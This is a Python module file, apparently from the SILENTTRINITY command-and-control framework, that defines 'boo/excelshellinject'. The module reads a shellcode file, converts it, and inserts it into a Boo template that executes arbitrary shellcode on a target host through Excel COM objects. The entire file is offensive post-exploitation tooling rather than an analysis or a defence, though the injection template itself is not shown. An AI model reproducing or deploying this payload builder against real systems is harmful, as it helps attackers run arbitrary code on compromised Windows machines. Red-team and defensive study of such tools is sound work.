import os
from base64 import b64encode
from silenttrinity.core.utils import convert_shellcode, get_path_in_package
from silenttrinity.core.teamserver.module import Module


class STModule(Module):
    def __init__(self):
        self.name = 'boo/excelshellinject'
        self.language = 'boo'
        self.description = 'Executes arbitrary shellcode using Excel COM objects'
        self.author = '@byt3bl33d3r'
        self.references = ["Microsoft.Office.Interop.Excel"]
        self.options = {
            'Shellcode': {
                'Description'   :   'Path to shellcode in ASCII hex format (e.g.: 31c0c3 or \\x31\\xc0\\xc3)',
                'Required'      :   True,
                'Value'         :   ''
            }
        }

    def payload(self):
        with open(get_path_in_package('core/teamserver/modules/boo/src/excelshellinject.boo')) as module:
            module = module.read()
            shellcode_path = os.path.expanduser(self.options['Shellcode']['Value'])
            if not os.path.exists(shellcode_path):
                raise Exception("Shellcode not found in specified path")

            with open(shellcode_path, 'r') as shellcode:
                module = module.replace('~SHELLCODEDECCSV~', convert_shellcode(shellcode.read()))
                return module
